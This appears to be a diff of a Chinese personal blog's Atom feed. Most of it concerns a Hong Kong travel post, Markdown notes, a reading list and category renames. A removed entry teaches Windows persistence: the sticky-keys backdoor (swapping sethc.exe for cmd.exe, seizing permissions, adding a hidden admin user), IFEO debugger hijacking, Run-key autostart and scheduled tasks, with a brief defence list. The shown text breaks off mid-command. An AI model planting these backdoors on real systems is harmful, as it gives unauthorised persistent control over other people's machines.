-<p>故事开始于一次和朋友说起去香港玩的事，后来也搁置了几个月，年后才隐约有的打算，看到同事也过去玩了，所以搜索了相关攻略后，迫不及待地去办了通行证。虽然踩了几个坑，但是最后还是如愿以偿办到了。</p>
-<p>当时照相是可以到出入境大厅免费拍照的，但是网友忽悠在手机上办理多出了20，然后办证也需要预约，要好长时间才能办，但是走人工通道也去一趟就办好了，深圳的办公还是很人性化和高效的。当时签注只有香港，去拿证的时候想着也就几块钱一并签了澳门，没想到后面派上了用场。</p>
-<h2>0x02 出发</h2>
-<p>在周末，我随便看了攻略便出发了，从深圳湾口岸出发，顺利过境后坐上了去天水围B2P公交，支付很方便，可以使用微信和支付宝，但是也办了八达通，也埋了一个雷。<br>
-在天水围下车，手机已经没有信号，手机上买了流量卡。当时看到的是基础设施和大陆有所不同，车子都是右舵，刚来还有点不太习惯，文字使用繁体字，这导致好多文字我也不认识。<br>
-在天水围乘坐公交，一路到旺角这边，路上看到的很多景象确实和国内不一样。</p>]]></summary>
-    <content type="html"><![CDATA[
-<h2>0x01 计划</h2>
-<p>故事开始于一次和朋友说起去香港玩的事，后来也搁置了几个月，年后才隐约有的打算，看到同事也过去玩了，所以搜索了相关攻略后，迫不及待地去办了通行证。虽然踩了几个坑，但是最后还是如愿以偿办到了。</p>
-<p>当时照相是可以到出入境大厅免费拍照的，但是网友忽悠在手机上办理多出了20，然后办证也需要预约，要好长时间才能办，但是走人工通道也去一趟就办好了，深圳的办公还是很人性化和高效的。当时签注只有香港，去拿证的时候想着也就几块钱一并签了澳门，没想到后面派上了用场。</p>
-<h2>0x02 出发</h2>
-<p>在周末，我随便看了攻略便出发了，从深圳湾口岸出发，顺利过境后坐上了去天水围B2P公交，支付很方便，可以使用微信和支付宝，但是也办了八达通，也埋了一个雷。<br>
-在天水围下车，手机已经没有信号，手机上买了流量卡。当时看到的是基础设施和大陆有所不同，车子都是右舵，刚来还有点不太习惯，文字使用繁体字，这导致好多文字我也不认识。<br>
-在天水围乘坐公交，一路到旺角这边，路上看到的很多景象确实和国内不一样。</p>
-<figure><figcaption>香港街头</figcaption></figure>
-<h2>0x03 街道</h2>
-<p>下了公交，由于对周围不够熟悉，加之攻略做的不够详细，上午其实在油麻地附近瞎逛了很久，去看了油麻地警署，很多人拍照，但是我们这层人似乎对这一打卡点没有太多的情怀，看了一会便离开。但是附近的老城确实很有特色，密密麻麻的各式各样的招牌、小广告交错在一起，新事物与旧事物交织在一起，让这里变得更加有年代感。</p>
-<figure><figcaption></figcaption></figure>
-<h2>0x04 维多利亚港</h2>
-<p>一路直走，来到了维多利亚港，这里风景开阔，人也很多，但是当天天气不好，照片显得昏沉。打卡了星光大道、李小龙雕像。并徘徊了久，坐在钟楼广场前的石椅上，吹着风，看着海上游船来往。<br>
-维多利亚港的天星小轮缓缓驶过，绿色的船身在碧蓝海面上划出温柔涟漪。这是香港最经典的渡海方式，百年航线，承载着无数人的日常与浪漫。</p>
-<figure><figcaption>游船</figcaption></figure>
-<p>对面即是中环的摩天大楼如森林般矗立，玻璃幕墙映照着蓝天白云。这里是香港的经济心脏，也是都市繁华最直观的展现。</p>
-<figure><figcaption>中环</figcaption></figure>
-<h2>0x05 星光大道</h2>
-<p>一路走着，成龙、周润发、张国荣、李小龙、梅艳芳、刘德华、梁朝伟等传奇人物映入眼帘，为了表彰对香港电影工业做出杰出贡献的台前幕后工作者。大道全长约440米，效仿好莱坞星光大道，地上镶嵌了超过百块明星名牌与手印。</p>
-<p>星光大道上的李小龙铜像，保持着经典的武术姿势，眼神坚定有力。他不仅是功夫巨星，更是无数人心中不屈不挠的香港精神象征。</p>
-<figure><figcaption>李小龙雕像</figcaption></figure>
-<p><code>李小龙（1940–1973），功夫巨星、截拳道创始人，出生于美国旧金山，成长于香港。他以《唐山大兄》《精武门》《猛龙过江》《龙争虎斗》等影片打破西方对华人银幕形象的刻板印象，将中国功夫推向世界。李小龙倡导“以无法为有法，以无限为有限”的哲学思想，创立截拳道，强调自我表达与实战效率。</code></p>
-<figure><figcaption>星光大道张国荣</figcaption></figure>
-<p><code>张国荣（1956–2003），香港著名歌手与演员，他以《风继续吹》《Monica》《当年情》《沉默是金》等金曲横扫乐坛，1999年获香港乐坛最高荣誉“金针奖”；电影方面，他主演的《霸王别姬》荣获戛纳金棕榈奖，他饰演的程蝶衣成为影史经典，此外《阿飞正传》《春光乍泄》《倩女幽魂》《胭脂扣》等作品亦广受赞誉。张国荣以前卫的舞台艺术和真诚的人格魅力深受爱戴，每年4月1日（逝世纪念日）和9月12日（诞辰），各地粉丝自发在星光大道他的名牌前献花纪念。</code></p>
-<figure><figcaption>麦兜</figcaption></figure>
-<p>可爱的麦兜站在街头，圆滚滚的身子配上标志性的粉红耳朵。这只来自香港动画的小猪，用纯真和善良温暖了无数人的童年。</p>
-<figure><figcaption>轮渡</figcaption></figure>
-<h2>0x06 纪念碑</h2>
-<p>纪念碑耸立在会展中心旁的纪念碑，碑文简练庄重，记录着那历史性的一刻。碑文由中华人民共和国前主席江泽民亲笔题写，寥寥数语却庄严地宣告了香港特别行政区的成立与“一国两制”伟大构想的成功实践。纪念碑前的国旗与区旗冉冉升起，与维多利亚港的潮汐共映，既提醒世人铭记那洗刷百年国耻的历史时刻，也象征着香港与祖国紧密相连、共创繁荣的坚定信念。</p>
-<figure><figcaption>香港回归祖国纪念碑</figcaption></figure>
-<h2>0x07 紫荆花</h2>
-<p><code>紫荆花，正式名称为洋紫荆（Bauhinia × blakeana），花瓣紫红色，呈五片兰花状，叶片形似羊蹄，1880年左右由法国传教士在香港岛被发现，为天然杂交种，不育，只能通过扦插繁殖。1965年，洋紫荆被定为香港市花；1997年香港回归祖国后，其图案被纳入香港特别行政区区徽和区旗，位于湾仔金紫荆广场的“永远盛开的紫荆花”雕塑则成为回归纪念地标。洋紫荆冬季盛开、花期长久，象征香港坚韧繁荣、不畏风雨，区旗上五片花瓣各含一颗星，寓意“一国两制”下香港与内地团结与希望。</code></p>
-<figure><figcaption>紫荆花</figcaption></figure>
-<h2>0x08 夜景及灯光秀</h2>
-<figure><figcaption>夜景</figcaption></figure>
-<p>晚上的灯光秀准时上演，激光与音乐配合，点亮两岸天际线。摩天大楼成了光影的画布，钟楼用多国语言播报，突然觉得这是多么的国际化。演绎着东方之珠的不夜传奇。</p>
-<figure><figcaption>灯光秀</figcaption></figure>
-<p>至此，游玩结束，我乘坐着地铁，从罗湖口岸回深圳，感慨万千，犹如梦境，小时候历史课本中的场景就这样照进了我的现实...</p>
-]]></content>
-    <category term="香港"/>
-    <published>2026-05-13T15:45:32.000Z</published>
   </entry>
   <entry>
     <title type="text">H-worm (VBS蠕虫) 感染事件溯源分析报告</title>
@@ -2467,9 +2492,9 @@ c</p>
   </entry>
   <entry>
     <title type="text">Markdown 原生图片</title>
-    <id>https://min168.top/com/other/Markdown%E5%8E%9F%E7%94%9F%E5%9B%BE%E7%89%87.html</id>
-    <link href="https://min168.top/com/other/Markdown%E5%8E%9F%E7%94%9F%E5%9B%BE%E7%89%87.html"/>
-    <updated>2025-12-07T11:01:10.000Z</updated>
+    <id>https://min168.top/com/grammar/Markdown%E5%8E%9F%E7%94%9F%E5%9B%BE%E7%89%87.html</id>
+    <link href="https://min168.top/com/grammar/Markdown%E5%8E%9F%E7%94%9F%E5%9B%BE%E7%89%87.html"/>
+    <updated>2026-10-20T16:09:46.000Z</updated>
     <summary type="html"><![CDATA[<h3>基本图片</h3>
 <figure><img src="https://images.unsplash.com/photo-1506905925346-21bda4d32df4?w=600&amp;auto=format&amp;fit=crop" alt="雪山风景" tabindex="0" loading="lazy"><figcaption>雪山风景</figcaption></figure>
 <h3>带标题和居中对齐</h3>
@@ -6721,13 +6746,6 @@ SIEM是一种整体性的安全方法。它将​安全信息管理（SIM） ​
     <published>2025-07-26T23:34:04.000Z</published>
   </entry>
   <entry>
-    <title type="text">旅行摄影记录</title>
-    <id>https://min168.top/com/travel/</id>
-    <link href="https://min168.top/com/travel/"/>
-    <updated>2026-09-01T11:47:25.000Z</updated>
-    <published>2025-07-20T07:44:45.000Z</published>
-  </entry>
-  <entry>
     <title type="text">学习逆向工程相关概念</title>
     <id>https://min168.top/net/%E5%AD%A6%E4%B9%A0%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E7%9B%B8%E5%85%B3%E6%A6%82%E5%BF%B5.html</id>
     <link href="https://min168.top/net/%E5%AD%A6%E4%B9%A0%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E7%9B%B8%E5%85%B3%E6%A6%82%E5%BF%B5.html"/>
@@ -8677,9 +8695,9 @@ Finished：客户端和服务器各自计算并发送一个Finished数据包，�
   </entry>
   <entry>
     <title type="text">markdown基本语法</title>
-    <id>https://min168.top/com/other/markdown%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95.html</id>
-    <link href="https://min168.top/com/other/markdown%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95.html"/>
-    <updated>2025-12-07T11:01:10.000Z</updated>
+    <id>https://min168.top/com/grammar/markdown%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95.html</id>
+    <link href="https://min168.top/com/grammar/markdown%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95.html"/>
+    <updated>2026-10-20T16:09:46.000Z</updated>
     <summary type="html"><![CDATA[<h3>一、标题</h3>
 <p>Markdown支持六级标题，使用<code>#</code>号表示不同级别的标题。一级标题使用一个<code>#</code>，二级标题使用两个<code>#</code>，以此类推，最多支持到六级标题。例如：</p>
 <div class="language-markdown line-numbers-mode" data-highlighter="shiki" data-ext="markdown" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-markdown"><span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75"># 一级标题</span></span>
@@ -8714,6 +8732,116 @@ Finished：客户端和服务器各自计算并发送一个Finished数据包，�
 <div class="language-markdown line-numbers-mode" data-highlighter="shiki" data-ext="markdown" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-markdown"><span class="line"></span></code></pre>
 <div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div>]]></content>
     <category term="markdown"/>
+    <published>2025-03-07T06:05:23.000Z</published>
+  </entry>
+  <entry>
+    <title type="text">我的阅读</title>
+    <id>https://min168.top/com/read/</id>
+    <link href="https://min168.top/com/read/"/>
+    <updated>2026-10-20T16:09:46.000Z</updated>
+    <summary type="html"><![CDATA[<div class="card-container">
+  <a class="image-card" href="./《认知觉醒》读书笔记.html">
+    
+    <div class="card-content">
+      <h3 class="card-title">认知觉醒</h3>
+      <p class="card-desc">《认知觉醒》是作者周岭的作品，通过深入浅出的方式揭示了人类思维运作的底层逻辑，帮助我们理解大脑的认知机制，掌握提升学习力、思考力和行动力的有效方法，开启自我改变的觉醒之路。</p>
+    </div>
+  </a>
+  <a class="image-card" href="./《悉达多》读书笔记.html">
+    
+    <div class="card-content">
+      <h3 class="card-title">悉达多</h3>
+      <p class="card-desc">《悉达多》是德国作家赫尔曼·黑塞的经典作品，讲述了一位古印度贵族青年寻求生命真谛的修行之旅。通过悉达多的人生经历，探索自我、生命意义与精神觉醒的主题，充满了哲学思考和诗意表达。</p>
+    </div>
+  </a>
+  <a class="image-card" href="./《稀缺》读书笔记.html">
+    
+    <div class="card-content">
+      <h3 class="card-title">稀缺</h3>
+      <p class="card-desc">《稀缺》是经济学家塞德希尔·穆来纳森和心理学家埃尔德·沙菲尔合著的作品，深入探讨了"稀缺心态"如何影响我们的思维方式和决策能力。书中揭示了为什么忙碌的人会更忙，贫穷的人会更穷的心理机制。</p>
+    </div>
+  </a>
+  <a class="image-card" href="./《心理学》读书笔记.html">
+    
+    <div class="card-content">
+      <h3 class="card-title">心理学</h3>
+      <p class="card-desc">这是一本关于心理学基础知识的入门读物，系统介绍了心理学的核心概念、主要流派和研究方法。内容涵盖认知、情绪、人格、发展等多个领域，帮助读者建立对心理学学科的整体认识和理解框架。</p>
+    </div>
+  </a>
+  <a class="image-card" href="./《营养学》读书笔记.html">
+    
+    <div class="card-content">
+      <h3 class="card-title">营养学</h3>
+      <p class="card-desc">这本营养学读物全面介绍了人体所需的各种营养素、饮食平衡原则以及健康饮食的科学依据。内容涵盖宏量营养素、微量营养素、膳食指南等，帮助读者建立科学的饮食观念，提升健康生活质量。</p>
+    </div>
+  </a>
+  <a class="image-card" href="./《斯坦福大学人生设计课》.html">
+    
+    <div class="card-content">
+      <h3 class="card-title">斯坦福大学人生设计课</h3>
+      <p class="card-desc">将产品设计思维运用于人生规划。课程目标是“如何运用设计思维，发现自己未来想做什么？”核心定位是用设计思维替代传统人生规划，解决迷茫、焦虑和选择困难。核心理念是：人生不存在完美规划，只有“更适合的人生”。</p>
+    </div>
+  </a>
+  <a class="image-card" href="./《被讨厌的勇气》读书笔记.html">
+    
+    <div class="card-content">
+      <h3 class="card-title">被讨厌的勇气</h3>
+      <p class="card-desc">伊西罗&amp;弗兰克 的著作，通过对话形式阐述阿德勒心理学的核心概念。全书七大支柱涵盖课题分离、心理创伤重写、他人认可追求、人际关系平等、共同体感觉、当下觉知以及接纳自我与他者。书中强调分清自己的课题与他人的课题，摆脱他人期待的束缚，获得真正的自由和幸福。</p>
+    </div>
+  </a>
+</div>]]></summary>
+    <content type="html"><![CDATA[<div class="card-container">
+  <a class="image-card" href="./《认知觉醒》读书笔记.html">
+    
+    <div class="card-content">
+      <h3 class="card-title">认知觉醒</h3>
+      <p class="card-desc">《认知觉醒》是作者周岭的作品，通过深入浅出的方式揭示了人类思维运作的底层逻辑，帮助我们理解大脑的认知机制，掌握提升学习力、思考力和行动力的有效方法，开启自我改变的觉醒之路。</p>
+    </div>
+  </a>
+  <a class="image-card" href="./《悉达多》读书笔记.html">
+    
+    <div class="card-content">
+      <h3 class="card-title">悉达多</h3>
+      <p class="card-desc">《悉达多》是德国作家赫尔曼·黑塞的经典作品，讲述了一位古印度贵族青年寻求生命真谛的修行之旅。通过悉达多的人生经历，探索自我、生命意义与精神觉醒的主题，充满了哲学思考和诗意表达。</p>
+    </div>
+  </a>
+  <a class="image-card" href="./《稀缺》读书笔记.html">
+    
+    <div class="card-content">
+      <h3 class="card-title">稀缺</h3>
+      <p class="card-desc">《稀缺》是经济学家塞德希尔·穆来纳森和心理学家埃尔德·沙菲尔合著的作品，深入探讨了"稀缺心态"如何影响我们的思维方式和决策能力。书中揭示了为什么忙碌的人会更忙，贫穷的人会更穷的心理机制。</p>
+    </div>
+  </a>
+  <a class="image-card" href="./《心理学》读书笔记.html">
+    
+    <div class="card-content">
+      <h3 class="card-title">心理学</h3>
+      <p class="card-desc">这是一本关于心理学基础知识的入门读物，系统介绍了心理学的核心概念、主要流派和研究方法。内容涵盖认知、情绪、人格、发展等多个领域，帮助读者建立对心理学学科的整体认识和理解框架。</p>
+    </div>
+  </a>
+  <a class="image-card" href="./《营养学》读书笔记.html">
+    
+    <div class="card-content">
+      <h3 class="card-title">营养学</h3>
+      <p class="card-desc">这本营养学读物全面介绍了人体所需的各种营养素、饮食平衡原则以及健康饮食的科学依据。内容涵盖宏量营养素、微量营养素、膳食指南等，帮助读者建立科学的饮食观念，提升健康生活质量。</p>
+    </div>
+  </a>
+  <a class="image-card" href="./《斯坦福大学人生设计课》.html">
+    
+    <div class="card-content">
+      <h3 class="card-title">斯坦福大学人生设计课</h3>
+      <p class="card-desc">将产品设计思维运用于人生规划。课程目标是“如何运用设计思维，发现自己未来想做什么？”核心定位是用设计思维替代传统人生规划，解决迷茫、焦虑和选择困难。核心理念是：人生不存在完美规划，只有“更适合的人生”。</p>
+    </div>
+  </a>
+  <a class="image-card" href="./《被讨厌的勇气》读书笔记.html">
+    
+    <div class="card-content">
+      <h3 class="card-title">被讨厌的勇气</h3>
+      <p class="card-desc">伊西罗&amp;弗兰克 的著作，通过对话形式阐述阿德勒心理学的核心概念。全书七大支柱涵盖课题分离、心理创伤重写、他人认可追求、人际关系平等、共同体感觉、当下觉知以及接纳自我与他者。书中强调分清自己的课题与他人的课题，摆脱他人期待的束缚，获得真正的自由和幸福。</p>
+    </div>
+  </a>
+</div>
+]]></content>
     <published>2025-03-07T06:05:23.000Z</published>
   </entry>
   <entry>
@@ -9343,10 +9471,10 @@ Finished：客户端和服务器各自计算并发送一个Finished数据包，�
     <published>2025-03-02T05:52:48.000Z</published>
   </entry>
   <entry>
-    <title type="text">其他杂项🧶</title>
+    <title type="text">其他杂项</title>
     <id>https://min168.top/com/other/</id>
     <link href="https://min168.top/com/other/"/>
-    <updated>2025-12-13T14:38:00.000Z</updated>
+    <updated>2026-10-20T16:09:46.000Z</updated>
     <published>2025-03-02T05:52:48.000Z</published>
   </entry>
   <entry>
@@ -10951,30 +11079,17 @@ Finished：客户端和服务器各自计算并发送一个Finished数据包，�
     <published>2025-02-08T14:18:57.000Z</published>
   </entry>
   <entry>
-    <title type="text">人生档案</title>
+    <title type="text">我的干货</title>
     <id>https://min168.top/com/</id>
     <link href="https://min168.top/com/"/>
-    <updated>2026-09-01T08:34:40.000Z</updated>
-    <summary type="html"><![CDATA[<p>pnpm docs:dev</p>
-<p>++++++++++++++++++++++++++++++++++</p>
-<p>人生如日志，我负责 <code>append</code>，你负责 <code>grep</code>。<br>
-所有痕迹皆可追溯，所有记忆皆可回滚。</p>
-<hr>
-<p>Life is a log: I <code>append</code>, you <code>grep</code>.<br>
-Every trace is traceable, and every memory is <code>rollback</code>-able.</p>
-]]></summary>
-    <content type="html"><![CDATA[<p>pnpm docs:dev</p>
-<p>++++++++++++++++++++++++++++++++++</p>
-<p>人生如日志，我负责 <code>append</code>，你负责 <code>grep</code>。<br>
-所有痕迹皆可追溯，所有记忆皆可回滚。</p>
-]]></content>
+    <updated>2026-10-20T16:09:46.000Z</updated>
     <published>2025-01-27T14:53:53.000Z</published>
   </entry>
   <entry>
-    <title type="text">职业素养💼</title>
+    <title type="text">求职面试</title>
     <id>https://min168.top/com/job/</id>
     <link href="https://min168.top/com/job/"/>
-    <updated>2025-12-13T14:38:00.000Z</updated>
+    <updated>2026-10-20T16:09:46.000Z</updated>
     <published>2025-01-27T14:53:53.000Z</published>
   </entry>
   <entry>
@@ -11017,7 +11132,7 @@ Every trace is traceable, and every memory is <code>rollback</code>-able.</p>
     <title type="text">学习Linux命令</title>
     <id>https://min168.top/net/%E5%AD%A6%E4%B9%A0Linux%E5%91%BD%E4%BB%A4.html</id>
     <link href="https://min168.top/net/%E5%AD%A6%E4%B9%A0Linux%E5%91%BD%E4%BB%A4.html"/>
-    <updated>2025-12-05T16:22:10.000Z</updated>
+    <updated>2026-10-20T16:09:46.000Z</updated>
     <summary type="html"><![CDATA[<p>在Linux和类Unix操作系统中，波浪号（<code>~</code>​）代表当前用户的主目录（home directory）</p>
 <p>例如，如果当前用户是<code>alice</code>​，并且她的主目录是<code>/home/alice</code>​，那么<code>~</code>​就代表<code>/home/alice</code>​。</p>
 <p>全局可执行程序会被放置在<code>/usr/local/bin</code>​（对于本地安装的软件）或<code>/usr/bin</code>​（对于系统级的软件包）目录中。</p>
@@ -15395,815 +15510,5 @@ exp下载链接：<a href="https://github.com/SecWiki/linux-kernel-exploits" tit
 ]]></content>
     <category term="渗透测试"/>
     <published>2023-09-18T00:00:00.000Z</published>
-  </entry>
-  <entry>
-    <title type="text">Windows权限维持技术与后门持久化</title>
-    <id>https://min168.top/perm/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF%E4%B8%8E%E5%90%8E%E9%97%A8%E6%8C%81%E4%B9%85%E5%8C%96.html</id>
-    <link href="https://min168.top/perm/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF%E4%B8%8E%E5%90%8E%E9%97%A8%E6%8C%81%E4%B9%85%E5%8C%96.html"/>
-    <updated>2026-07-26T07:49:45.000Z</updated>
-    <summary type="html"><![CDATA[<p>php 不死马权限维持、映像劫持技术、策 略组脚本维持、shift 后门、建立影子账 号、power shell 配置文件后门、Monitor 权限维持、利用安全描述符隐藏服务后门 进行权限维持、iis 后门、window 隐藏技 术、驱动级文件隐藏</p>
-<h2>shift后门(shift backdoor)</h2>
-<p>绕过安全控制措施获取对程序或系统访问权限的方法。后门是一个留在目标主机上的软件，它可以使攻击者随时与目标主机进行连接 大多数情况下，后门是一个运行在目标主机上的<span data-type="text" style="color: var(--b3-font-color8);">隐藏进程</span>，可能允许一个<span data-type="text" style="color: var(--b3-font-color8);">普通的、未授权</span>的用户控制计算机 所以攻击者经常使用后门来控制服务器。</p>]]></summary>
-    <content type="html"><![CDATA[<p>php 不死马权限维持、映像劫持技术、策 略组脚本维持、shift 后门、建立影子账 号、power shell 配置文件后门、Monitor 权限维持、利用安全描述符隐藏服务后门 进行权限维持、iis 后门、window 隐藏技 术、驱动级文件隐藏</p>
-<h2>shift后门(shift backdoor)</h2>
-<p>绕过安全控制措施获取对程序或系统访问权限的方法。后门是一个留在目标主机上的软件，它可以使攻击者随时与目标主机进行连接 大多数情况下，后门是一个运行在目标主机上的<span data-type="text" style="color: var(--b3-font-color8);">隐藏进程</span>，可能允许一个<span data-type="text" style="color: var(--b3-font-color8);">普通的、未授权</span>的用户控制计算机 所以攻击者经常使用后门来控制服务器。</p>
-<p>比较老的方式 在winodws中有一些辅助功能，能在用户未登录系统之前就通过组合键来启动 Windows的粘滞键 在Windows系统按5下shift后，Windows就运行了System32下的sethc.exe,启动粘滞键粘滞键的位置:C:\windows\system32\sethc.exe</p>
-<h3>shift后门原理</h3>
-<p>把 cmd.exe 这个程序更名为 sethc.exe，并且把原来的sethc.exe替换掉 之后在登录界面连续按下5次shift键后，系统会以system权限运行cmd.exe 那么此时的 cmd.exe 就具有了管理权限，之后只要利用cmd增加一个管理员用户就可以登录进去，实现隐藏后门</p>
-<h3>shift后门制作</h3>
-<p>用 cmd.exe 替换 windows\system32 目录下的粘滞键可执行文件sethc.exe</p>
-<div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-python"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">cd c:\</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF">windows\system32 </span></span>
-<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">move sethc.exe sethc.exe.bak </span></span>
-<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">copy cmd.exe sethc.exe</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>​​</p>
-<p>拒绝访问将将权限目录下的所有文件及文件夹、子文件夹下的所有者更改为管理员组(administrators)</p>
-<div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-python"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">takeown </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">f c:\</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF">windows\system32\*.*   /a /r /d y</span></span>
-<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">cacls  c:\</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF">windows\system32\*.*  /T /E /G administrators:F</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div><p>重新替换</p>
-<p>​​</p>
-<p>锁定界面5次shift后</p>
-<p>​​</p>
-<p>将其添加用户到管理员用户组</p>
-<div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-python"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">net user xiao </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">123456</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> /</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">add </span><span style="--shiki-light:white;--shiki-dark:#FFFFFF">&amp;&amp;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> net localgroup administrators xiao </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">add</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>​​</p>
-<p>​​</p>
-<h3>shift后门防御</h3>
-<ul>
-<li>在远程登录服务器时，连续按5次 shift 键，判断服务器是否被入侵</li>
-<li>禁用该 sethc.exe 功能 或者在“控制面板”中关闭“连续按5次shift键时启用粘滞键选项</li>
-<li>使用权限约束 sethc.exe，使任何人都不能访问它</li>
-</ul>
-<h2>映像劫持 IFEO(lmage File Execution Options)</h2>
-<h3>映像劫持原理</h3>
-<p>在高版本的windows版本中<span data-type="text" style="color: var(--b3-font-color8);">替换的文件受到了系统的保护</span>，所以需要进行"映像劫持“ 可以理解为当打开a.exe程序实际打开的却是b.exe程序，那么a程序就是被b程序劫持了。是为一些在默认系统环境中运行时可能引发错误的 程序执行体提供特殊的环境设定。由于这个项主要是用来调试程序用的，对一般用户意义不大，默认是只有管理员和 local system有权读写修改.</p>
-<h3>制作映像劫持</h3>
-<ol>
-<li>
-<p>粘滞键的启动程序在C盘的Windows/system32目录下为sethc.exe</p>
-</li>
-<li>
-<p>regdit</p>
-</li>
-<li>
-<p>HKEY_LOCAL_MACHINE\ SOFTWARE \ Microsoft \ Windows NT \ CurrentVersion \ Image File ExecutionOption  新建项 sethc.exe</p>
-<p>​​</p>
-</li>
-<li>
-<p>在新建的项中添加debugger键，键值设置为恶意程序的路径</p>
-<p>​​</p>
-</li>
-<li>
-<p>这里用cmd路径代替。cmd路径：C:\Windows\system32\cmd.exe</p>
-<p>​​</p>
-</li>
-<li>
-<p>锁定访问</p>
-<p>​​</p>
-</li>
-</ol>
-<p>​​</p>
-<h2>启动项、计划任务</h2>
-<h3>注册表自启动后门</h3>
-<p>通过修改注册表实现自动启动需要运行程序</p>
-<p>最常见的在指定键值添加一个新的键值类型为 REG SZ,数据项中添写需要运行程序的路径即可以启动</p>
-<ol>
-<li>
-<p>打开注册表路径：HKEY LOCAL MACHINE/SOFTWARE/Microsoft/Windows/CurrentVersion/Run</p>
-</li>
-<li>
-<p>添加一个键值类型为REG SZ</p>
-</li>
-<li>
-<p>在数据中填写需要运行程序的路径</p>
-<p>​</p>
-</li>
-<li>
-<p>开机自动弹出</p>
-<p>​​</p>
-</li>
-</ol>
-<h3>计划任务后门</h3>
-<p>计划任务在 Windows7 及之前版本的操作系统中使用 <span data-type="text" style="color: var(--b3-font-color8);">at </span>命令调用，从 Windows8 等高版本的操作系统中使 用 <span data-type="text" style="color: var(--b3-font-color8);">schtasks </span>命令调用</p>
-<p>at命令是只会打开一个后台进程，而schtasks命令是将定时的任务在前台执行</p>
-<h4>at命令的参数</h4>
-<div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-python"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#D19A66">AT</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [\</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF">\computername] time [/INTERACTIVE] [ /EVERY:date[...]/NEXT:date....]] "command'</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h4>schtasks命令的参数</h4>
-<div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-python"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">schtasks </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">create </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">tn TaskName </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">tr TaskRun </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">sc schedule [</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">mo modifier] [</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">d day] [</span><span 